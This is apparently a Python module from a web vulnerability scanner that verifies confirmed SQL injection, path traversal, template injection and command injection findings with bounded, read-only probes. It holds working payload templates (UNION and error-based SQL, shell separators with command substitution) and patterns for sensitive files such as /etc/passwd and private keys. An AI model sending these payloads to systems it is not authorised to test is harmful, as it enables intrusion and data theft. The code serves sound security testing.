"""Proof of impact: turn a *confirmed* finding from "this is vulnerable" into "this is what
an attacker can actually read".

Runs only over findings an oracle already confirmed, so it can never create a false positive:
it just tries a **bounded, read-only** extraction and, if it succeeds, attaches the extracted
value to ``finding.impact``. If it fails (hardened target, unusual dialect, budget spent), the
finding stands exactly as it was.

- **SQL injection** — recover the DB version banner in-band via a marker-wrapped UNION or a
  cast/XPath error. High-signal (proves arbitrary DB read) and non-sensitive. The value is
  rejected if it still carries our own SQL tokens (a reflected payload, not evaluated output).
- **LFI / path traversal** — re-issue the confirming traversal and show a bounded snippet of the
  file, but only when the content matches a known sensitive-file signature (passwd, private key,
  a credentials file, …), so a normal page is never presented as an exfiltrated file.
- **SSTI** — inject a unique arithmetic and confirm the server *evaluated* it (not just reflected
  the literal), with a light engine fingerprint via ``7*'7'`` — proof of template-context code exec.
- **Command injection** — run a benign ``id``/``uname`` inside a marker-bracketed ``echo`` and read
  the *evaluated* output back (validated against ``uid=…``/kernel patterns, so a reflected literal
  doesn't count) — proof of OS command execution. Blind (OOB-only) cmdi returns nothing in-band, so
  it is left unproven rather than overclaimed.
"""

from __future__ import annotations

import re
import secrets

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Finding, HttpRequest, HttpResponse
from dastcore.engine.rule_engine import build_mutated_request

_MAX_REQ_PER_FINDING = 24  # hard cap so extraction never becomes a mini brute-force
_VALUE_CAP = 200  # bounded: a version banner, not a data dump
_INJECTABLE = ("query", "body", "json")

# Substrings that mean we captured our *own* payload reflected back, not evaluated DB output.
_ECHO_MARKERS = (
    "version(",
    "select ",
    "concat",
    "||",
    "+@@",
    "@@version",
    "extractvalue",
    "updatexml",
    "cast(",
    "convert(",
)


async def prove_findings_impact(
    client: HttpClient,
    findings: list[Finding],
    *,
    families: frozenset[str] = frozenset({"sqli", "lfi", "ssti", "cmdi"}),
) -> int:
    """Enrich confirmed findings in place with proof of impact. Returns how many were enriched."""
    provers = {"sqli": _prove_sqli, "lfi": _prove_lfi, "ssti": _prove_ssti, "cmdi": _prove_cmdi}
    proven = 0
    for finding in findings:
        if finding.impact or finding.family not in families:
            continue
        prover = provers.get(finding.family)
        proof = await prover(client, finding) if prover else None
        if proof:
            finding.impact = proof
            proven += 1
    return proven


async def _send(client: HttpClient, request: HttpRequest) -> HttpResponse | None:
    try:
        return await client.request(
            request.method,
            request.url,
            params=request.params or None,
            headers=request.headers or None,
            cookies=request.cookies or None,
            data=request.data,
            json=request.json_body,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


def _clean(value: str) -> str:
    """Collapse whitespace, drop control chars, and bound the length."""
    printable = "".join(ch for ch in value if ch.isprintable() or ch in " \t")
    return " ".join(printable.split())[:_VALUE_CAP]


def _extract_between(text: str, left: str, right: str) -> str | None:
    """The first value our asymmetric delimiters bracket that is *evaluated* output, not our own
    payload echoed back. Reflecting apps (``Results for {query}``) print the raw payload too, so we
    scan every ``left…right`` pair and skip the ones that still carry SQL — the reflected literals."""
    for m in re.finditer(re.escape(left) + r"(.+?)" + re.escape(right), text, re.S):
        inner = _clean(m.group(1))
        lowered = inner.lower()
        if inner and left not in inner and right not in inner and not any(tok in lowered for tok in _ECHO_MARKERS):
            return inner
    return None


def _dbms_of(banner: str, hint: str) -> str:
    """Name the DBMS from the banner text, falling back to the dialect that produced it."""
    low = banner.lower()
    if "sqlite" in low:
        return "SQLite"
    if "mariadb" in low:
        return "MariaDB"
    if "postgresql" in low or "postgres" in low:
        return "PostgreSQL"
    if "sql server" in low or "microsoft sql" in low:
        return "Microsoft SQL Server"
    if "mysql" in low:
        return "MySQL"
    return hint


def _proof(banner: str, dbms: str, technique: str) -> str:
    return (
        f"Lectura de la base de datos confirmada vía SQL injection ({technique}). "
        f"DBMS: {dbms}. Valor extraído (solo lectura, acotado): «{banner}». "
        "Demuestra que un atacante puede leer datos arbitrarios de la base de datos."
    )


# UNION dialects: (column expr with {l}/{r} delimiters and {v} version fn, version fn, DBMS hint).
_UNION_PROFILES = [
    ("'{l}'||{v}||'{r}'", "sqlite_version()", "SQLite"),
    ("'{l}'||{v}||'{r}'", "version()", "PostgreSQL"),
    ("CONCAT('{l}',{v},'{r}')", "version()", "MySQL/MariaDB"),
    ("'{l}'+{v}+'{r}'", "@@version", "Microsoft SQL Server"),
]
_BREAKOUTS = [("'", "-- "), ("'", "-- -"), ("'", "#"), ("", "-- ")]

# Error-based one-shots: (expression template with {l}/{r} delimiters, DBMS hint).
_ERROR_PROFILES = [
    ("AND extractvalue(1,concat('{l}',version(),'{r}'))", "MySQL/MariaDB"),
    ("AND updatexml(1,concat('{l}',version(),'{r}'),1)", "MySQL/MariaDB"),
    ("AND 1=cast(('{l}'||version()||'{r}') as int)", "PostgreSQL"),
    ("AND 1=convert(int,'{l}'+@@version+'{r}')", "Microsoft SQL Server"),
]


async def _prove_sqli(client: HttpClient, finding: Finding) -> str | None:
    point = finding.injection_point
    if point.location not in _INJECTABLE:
        return None
    tok = secrets.token_hex(5)
    left, right = "dl" + tok, "dr" + tok  # asymmetric, alnum, HTML-safe delimiters
    junk = "zq" + secrets.token_hex(3)  # a LIKE prefix no real row matches, so only our UNION row returns
    budget = _MAX_REQ_PER_FINDING

    # 1) UNION-based: put the delimited version in every column, widening 1..8 until it lands.
    for breakout, comment in _BREAKOUTS:
        for tmpl, version_fn, hint in _UNION_PROFILES:
            col = tmpl.format(l=left, r=right, v=version_fn)
            for ncols in range(1, 9):
                if budget <= 0:
                    return None
                budget -= 1
                cols = ",".join([col] * ncols)
                payload = f"{junk}{breakout} UNION SELECT {cols}{comment}"
                resp = await _send(client, build_mutated_request(point, payload))
                if resp is None:
                    continue
                banner = _extract_between(resp.text, left, right)
                if banner:
                    return _proof(banner, _dbms_of(banner, hint), "UNION-based")

    # 2) Error-based: a single crafted cast/XPath error that leaks the same banner.
    for breakout, comment in (("'", "-- "), ("", "-- ")):
        for tmpl, hint in _ERROR_PROFILES:
            if budget <= 0:
                return None
            budget -= 1
            payload = f"{junk}{breakout} {tmpl.format(l=left, r=right)}{comment}"
            resp = await _send(client, build_mutated_request(point, payload))
            if resp is None:
                continue
            banner = _extract_between(resp.text, left, right)
            if banner:
                return _proof(banner, _dbms_of(banner, hint), "basada en error")

    return None


# --- LFI / path traversal ---------------------------------------------------------------------
# Signatures of a genuinely sensitive file: only claim impact when the read content matches one,
# so we never present a normal page as "a file we exfiltrated". (label shown to the user.)
_LFI_SIGNATURES: list[tuple[str, str]] = [
    (r"root:.*:0:0:", "/etc/passwd (cuentas del sistema Unix)"),
    (r"-----BEGIN [A-Z ]*PRIVATE KEY-----", "una clave privada"),
    (r"(?im)^\s*(DB_PASSWORD|SECRET[_A-Z]*|API[_-]?KEY|PASSWORD|TOKEN)\s*[=:]", "un fichero con credenciales"),
    (r"\[build-system\]|\[tool\.", "pyproject.toml (configuración del proyecto)"),
    (r"\[(fonts|extensions|mci extensions)\]|for 16-bit app support", "Windows win.ini"),
    (r"<\?php", "código fuente PHP del servidor"),
]


async def _prove_lfi(client: HttpClient, finding: Finding) -> str | None:
    """Re-issue the confirming traversal and show a bounded snippet of the file it read — but only
    if the content matches a known sensitive-file signature, so we never overclaim on a normal page."""
    resp = await _send(client, finding.request)
    if resp is None or resp.status_code >= 400 or not resp.text:
        return None
    for pattern, label in _LFI_SIGNATURES:
        m = re.search(pattern, resp.text)
        if m:
            snippet = _clean(resp.text[max(0, m.start() - 8) : m.start() + 160])
            return (
                f"Lectura de fichero del servidor confirmada vía path traversal. Fichero: {label}. "
                f"Fragmento (solo lectura, acotado): «{snippet}». "
                "Demuestra que un atacante puede leer ficheros arbitrarios del servidor."
            )
    return None


# --- SSTI / server-side template injection ----------------------------------------------------
# (open, close) for the template dialects we try; the arithmetic between them must be *evaluated*.
_SSTI_SYNTAX: list[tuple[str, str]] = [("{{", "}}"), ("${", "}"), ("#{", "}"), ("<%=", "%>"), ("{", "}")]


def _has_exact(text: str, left: str, right: str, expected: str) -> bool:
    """True if some left…right pair brackets exactly ``expected`` (an evaluated result, not the echoed
    template literal, which still contains the braces)."""
    return any(
        m.group(1).strip() == expected for m in re.finditer(re.escape(left) + r"(.+?)" + re.escape(right), text, re.S)
    )


async def _ssti_engine(client: HttpClient, finding: Finding, op: str, cl: str, left: str, right: str) -> str:
    """Best-effort engine fingerprint via ``7*'7'`` — Jinja2 concatenates ('7777777'), Twig multiplies (49)."""
    payload = f"{left}{op}7*'7'{cl}{right}"
    resp = await _send(client, build_mutated_request(finding.injection_point, payload))
    if resp is None:
        return ""
    if _has_exact(resp.text, left, right, "7777777"):
        return "Jinja2 (Python)"
    if _has_exact(resp.text, left, right, "49"):
        return "Twig/Smarty"
    return ""


# --- OS command injection ---------------------------------------------------------------------
# (command, a pattern its real output matches, human label). Benign, read-only commands only.
_CMDI_PROBES: list[tuple[str, str, str]] = [
    ("id", r"uid=\d+\(", "id"),
    ("uname -a", r"\b(Linux|Darwin|FreeBSD|GNU|SunOS)\b", "uname -a"),
]
# Bracket the command's output with our delimiters via a shell ``echo`` + command substitution,
# behind the separators that break out of the surrounding command.
_CMDI_TEMPLATES: list[str] = [
    "; echo {l}$({cmd}){r}",
    "| echo {l}$({cmd}){r}",
    "& echo {l}$({cmd}){r}",
    "\n echo {l}$({cmd}){r}",
]


def _extract_validated(text: str, left: str, right: str, pattern: str) -> str | None:
    """The first left…right pair whose content matches ``pattern`` — i.e. real command output, not
    the reflected payload (``$(id)``), which never matches ``uid=…``."""
    rx = re.compile(pattern)
    for m in re.finditer(re.escape(left) + r"(.+?)" + re.escape(right), text, re.S):
        inner = _clean(m.group(1))
        if rx.search(inner):
            return inner
    return None


async def _prove_cmdi(client: HttpClient, finding: Finding) -> str | None:
    """Run a benign ``id``/``uname`` in-band and read the evaluated output — proof of OS command
    execution. Blind (OOB) command injection returns nothing here, so it stays unproven."""
    point = finding.injection_point
    if point.location not in _INJECTABLE:
        return None
    tok = secrets.token_hex(5)
    left, right = "cl" + tok, "cr" + tok
    budget = _MAX_REQ_PER_FINDING
    for tmpl in _CMDI_TEMPLATES:
        for cmd, pattern, label in _CMDI_PROBES:
            if budget <= 0:
                return None
            budget -= 1
            payload = tmpl.format(l=left, r=right, cmd=cmd)
            resp = await _send(client, build_mutated_request(point, payload))
            if resp is None:
                continue
            output = _extract_validated(resp.text, left, right, pattern)
            if output:
                return (
                    f"Ejecución de comandos del sistema confirmada: `{label}` devolvió «{output}». "
                    "Demuestra que un atacante puede ejecutar comandos arbitrarios en el servidor (RCE)."
                )
    return None


async def _prove_ssti(client: HttpClient, finding: Finding) -> str | None:
    """Inject a unique arithmetic and confirm the server *evaluated* it — proof of code execution in
    the template context (SSTI → possible RCE), with a light engine fingerprint."""
    point = finding.injection_point
    if point.location not in _INJECTABLE:
        return None
    a, b = 100 + secrets.randbelow(900), 100 + secrets.randbelow(900)
    product = str(a * b)
    tok = secrets.token_hex(5)
    left, right = "sl" + tok, "sr" + tok
    for op, cl in _SSTI_SYNTAX:
        payload = f"{left}{op}{a}*{b}{cl}{right}"
        resp = await _send(client, build_mutated_request(point, payload))
        if resp is not None and _has_exact(resp.text, left, right, product):
            engine = await _ssti_engine(client, finding, op, cl, left, right)
            engine_clause = f" (motor: {engine})" if engine else ""
            return (
                f"Ejecución de expresiones en plantilla confirmada del lado servidor: la expresión "
                f"{op}{a}*{b}{cl} se evaluó a {product}{engine_clause}. "
                "Un atacante puede ejecutar código en el servidor (SSTI → posible RCE)."
            )
    return None
